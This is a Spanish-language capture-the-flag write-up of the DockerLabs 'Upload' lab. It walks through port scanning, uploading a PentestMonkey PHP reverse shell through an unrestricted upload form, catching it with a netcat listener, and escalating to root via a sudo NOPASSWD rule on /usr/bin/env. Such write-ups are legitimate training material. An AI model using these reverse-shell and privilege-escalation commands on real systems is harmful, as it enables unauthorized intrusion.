---
title: Upload
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-06-02
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-upload/upload_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - tcp
  - http
  - php
  - rce
  - interactive_tty
  - sudo_abuse
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/upload:-$ ping -c 1 172.17.0.3                       
PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.066 ms

--- 172.17.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.066/0.066/0.066/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/upload:-$ nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.3 -n -Pn -oG nmap1
Host: 172.17.0.3 ()	Status: Up
Host: 172.17.0.3 ()	Ports: 80/open/tcp//http///	Ignored State: closed (65534)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/upload:-$ nmap -sCV -vvv -p80 172.17.0.3 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
MAC Address: DE:6E:DF:98:83:32 (Unknown)
```

```terminal
/home/kali/Documents/dockerlabs/upload:-$ whatweb 172.17.0.3
http://172.17.0.3 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.3], Title[Upload here your file]
```

---
## Web Analysis & Vulnerability Exploitation

El servicio web en el puerto 80 presenta un único formulario funcional, que permite subir archivos al servidor Apache. El formulario acepta archivos `.php`, lo que sugiere una posible vía de ejecución remota de código si el archivo es accesible públicamente.

![](assets/img/dockerlabs-writeup-upload/upload1_1.png)

Realizo un escaneo de rutas, lo que permite descubrir el directorio `/uploads/`, el cual está expuesto y accesible.

```terminal
/home/kali/Documents/dockerlabs/upload:-$ dirb http://172.17.0.3/
---- Scanning URL: http://172.17.0.3/ ----
+ http://172.17.0.3/index.html (CODE:200|SIZE:1361)
+ http://172.17.0.3/server-status (CODE:403|SIZE:275)
==> DIRECTORY: http://172.17.0.3/uploads/
```

Descargó la reverse shell de PentestMonkey, modifico la IP y puerto y subo el archivo mediante el formulario.

```terminal
/home/kali/Documents/dockerlabs/upload:-$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
```

Luego de subir la shell, y acceder a `/uploads/` se puede ver que el archivo aparece listado correctamente.

![](assets/img/dockerlabs-writeup-upload/upload1_2.png)


Con esto definido, inicio un listener con netcat.

```terminal
/home/kali/Documents/dockerlabs/upload:-$ nc -lnvp 4321
	listening on [any] 4321 ...
```

Y ejecutó la reverse shell desde la treminal con curl. Esto me otorga acceso remoto con permisos del usuario `www-data`.

```terminal
/home/kali/Documents/dockerlabs/upload:-$ curl http://172.17.0.3/uploads/shell.php

	... connect to [172.17.0.1] from (UNKNOWN) [172.17.0.3] 46044

www-data@07b83fa8d21f:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Privilege Escalation

Para mejorar la interacción, restauro el entorno interactivo para mejorar la visibilidad y control de la shell.

```terminal
www-data@07b83fa8d21f:/$ script /dev/null -c bash
www-data@07b83fa8d21f:/$ ^Z
home/kali/Documents/dockerlabs/upload:-$ stty raw -echo;fg
[2]  + continued  nc -nvlp 4321
				reset xterm

www-data@07b83fa8d21f:/$ export TERM=xterm
www-data@07b83fa8d21f:/$ export SHELL=bash
www-data@07b83fa8d21f:/$ stty rows 36 columns 138
```

Consulto el archivo `/etc/passwd` para identificar otros usuarios del sistema, los cuales poseen shells válidos.

```terminal
www-data@07b83fa8d21f:/$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

Los permisos `sudo`, revelan que el binario `/usr/bin/env` puede ejecutarse como `root` sin necesidad de contraseña.

```terminal
www-data@07b83fa8d21f:/$ sudo -l
Matching Defaults entries for www-data on 07b83fa8d21f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 07b83fa8d21f:
    (root) NOPASSWD: /usr/bin/env
```

Tal como se documenta en [GTFObins](https://gtfobins.github.io/gtfobins/env/#sudo). Esta configuración permite escalar privilegios a `root` mediante una shell directa con `env`.

```terminal
www-data@07b83fa8d21f:/$ sudo env /bin/bash

root@07b83fa8d21f:/# id
uid=0(root) gid=0(root) groups=0(root)
```
